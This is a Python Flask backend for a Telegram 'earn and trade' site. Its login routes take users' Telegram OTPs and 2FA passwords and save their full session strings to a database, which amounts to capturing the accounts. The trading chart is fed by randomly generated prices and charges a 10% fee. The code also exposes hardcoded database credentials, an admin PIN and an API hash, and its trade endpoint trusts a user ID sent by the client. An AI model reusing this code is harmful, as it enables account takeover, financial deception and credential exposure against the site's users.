import os
import asyncio
import random
import time
from datetime import datetime
from threading import Thread
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from bson import ObjectId  # এটি যোগ করা হয়েছে (ObjectId এরর ফিক্স করতে)
import firebase_admin
from firebase_admin import credentials, db

# ---------------------------------------------------------
# ১. Firebase কনফিগারেশন
# ---------------------------------------------------------
try:
    if not firebase_admin._apps:
        cred = credentials.Certificate("firebase-key.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://teleearnbd-default-rtdb.firebaseio.com/' 
        })
    fb_ref = db.reference('candles')
except Exception as e:
    print(f"Firebase Init Error: {e}")

# ---------------------------------------------------------
# ২. ফ্লাস্ক অ্যাপ ও ডাটাবেস সেটআপ
# ---------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

client_db = MongoClient(MONGO_URI, connectTimeoutMS=30000, socketTimeoutMS=30000)
mdb = client_db['aaf_tele_earn_db']
users_col = mdb['users']
ads_col = mdb['ads']  
tasks_col = mdb['tasks'] 
withdraws_col = mdb['withdraws']

temp_clients = {}

# ---------------------------------------------------------
# ৩. ক্যান্ডেল জেনারেটর লজিক (Background Thread)
# ---------------------------------------------------------
def generate_candles_background():
    print("🚀 Candle Generator Thread Started...")
    while True:
        try:
            # সর্বশেষ ক্যান্ডেলের ডাটা নেওয়া
            last_candle = fb_ref.order_by_key().limit_to_last(1).get()
            
            open_price = 1.0000
            if last_candle:
                for key, val in last_candle.items():
                    open_price = val['close']

            # প্রাইস মুভমেন্ট লজিক
            volatility = 0.002
            close_price = open_price + random.uniform(-volatility, volatility)
            
            new_candle = {
                "open": round(open_price, 4),
                "high": round(max(open_price, close_price) + random.uniform(0, 0.001), 4),
                "low": round(min(open_price, close_price) - random.uniform(0, 0.001), 4),
                "close": round(close_price, 4),
                "timestamp": int(time.time() * 1000)
            }

            fb_ref.push(new_candle)
            time.sleep(60) # প্রতি ১ মিনিট পর পর ক্যান্ডেল তৈরি হবে
        except Exception as e:
            print(f"🔥 Candle Gen Error: {e}")
            time.sleep(10)

# ক্যান্ডেল জেনারেটর ব্যাকগ্রাউন্ডে চালু করা
Thread(target=generate_candles_background, daemon=True).start()

# ---------------------------------------------------------
# ৪. HTML পেজ রাউটস
# ---------------------------------------------------------
@app.route('/dashboard')
def render_dashboard_page(): 
    if 'uid' not in session: return render_template('login.html')
    return render_template('dashboard.html')

@app.route('/task')
def render_task_page(): 
    if 'uid' not in session: return render_template('login.html')
    return render_template('task.html')

@app.route('/treading')
def render_treading_page():
    if 'uid' not in session: return render_template('login.html')
    return render_template('treading.html')

@app.route('/account')
def render_account_page():
    if 'uid' not in session: return render_template('login.html')
    return render_template('account.html')

@app.route('/wallet')
def render_wallet_page(): 
    if 'uid' not in session: return render_template('login.html')
    return render_template('wallet.html')

ADMIN_PIN = "Abdullah6790" 
@app.route('/admin')
def render_admin_panel():
    user_pin = request.args.get('pin')
    if user_pin == ADMIN_PIN:
        return render_template('admin.html')
    else:
        return f'Admin PIN needed', 403

# ---------------------------------------------------------
# ৫. টেলিগ্রাম লগইন এপিআই
# ---------------------------------------------------------
@app.route('/api/send_otp', methods=['POST'])
def send_otp_handler():
    data = request.json
    phone = data.get('phone')
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        result = client.send_code_request(phone)
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash}
        return jsonify({"success": True, "message": "OTP Sent!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login_handler():
    data = request.json
    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
    if phone not in temp_clients: return jsonify({"success": False, "message": "Session expired"})
    try:
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
        session_str = client.session.save()
        user_info = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "session_string": session_str, 
            "last_login": datetime.utcnow()
        }
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": user_info, "$setOnInsert": {"main_balance": 0.0, "aaf_balance": 0.0, "status": "active", "completed_tasks": []}},
            upsert=True
        )
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ---------------------------------------------------------
# ৬. ইউজার প্রোফাইল ও ট্রেড এপিআই
# ---------------------------------------------------------
@app.route('/api/user/dashboard_stats')
@app.route('/api/get_user_info')
def get_user_data_api():
    uid = session.get('uid')
    if not uid: return jsonify({"success": False})
    user = users_col.find_one({"telegram_id": uid})
    if user:
        return jsonify({
            "success": True,
            "balance": user.get('main_balance', 0.0),
            "aaf_balance": user.get('aaf_balance', 0.0),
            "name": user.get('name', 'User'),
            "id": uid
        })
    return jsonify({"success": False})

@app.route('/api/trade/execute', methods=['POST'])
def execute_trade():
    data = request.json
    uid = data.get('uid') or session.get('uid')
    trade_type = data.get('type') # BUY বা SELL
    amount = float(data.get('amount', 0))
    
    user = users_col.find_one({"telegram_id": int(uid)})
    if not user: return jsonify({"status": "error", "message": "User not found"})

    fee = amount * 0.10
    net_amount = amount - fee

    if trade_type == 'BUY':
        if user.get('main_balance', 0) < amount:
            return jsonify({"status": "error", "message": "Insufficient TK Balance!"})
        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"main_balance": -amount, "aaf_balance": net_amount}})
    else: 
        if user.get('aaf_balance', 0) < amount:
            return jsonify({"status": "error", "message": "Insufficient AAF Balance!"})
        users_col.update_one({"telegram_id": int(uid)}, {"$inc": {"aaf_balance": -amount, "main_balance": net_amount}})

    return jsonify({"status": "success"})

@app.route('/api/user/tasks/claim', methods=['POST'])
def claim_task():
    try:
        data = request.json
        uid = session.get('uid')
        task_id = data.get('task_id')
        task = tasks_col.find_one({"_id": ObjectId(task_id)})
        user = users_col.find_one({"telegram_id": uid})
        
        if user and task:
            if task_id in user.get("completed_tasks", []):
                return jsonify({"status": "error", "message": "Already Claimed!"})
            
            reward = float(task.get('reward', 0))
            users_col.update_one(
                {"telegram_id": uid},
                {"$inc": {"main_balance": reward}, "$push": {"completed_tasks": task_id}}
            )
            return jsonify({"status": "success", "reward": reward})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# ---------------------------------------------------------
# ৭. অন্যান্য এড ও টাস্ক এপিআই
# ---------------------------------------------------------
@app.route('/api/get_tasks')
def fetch_tasks():
    tasks = list(tasks_col.find({"status": "active"}))
    for t in tasks: t['_id'] = str(t['_id'])
    return jsonify({"success": True, "tasks": tasks})

@app.route('/api/get_ads')
def fetch_ads():
    return jsonify({"success": True, "ads": list(ads_col.find({}, {"_id": 0}))})

@app.route('/ping')
def ping_checker(): return "PONG", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
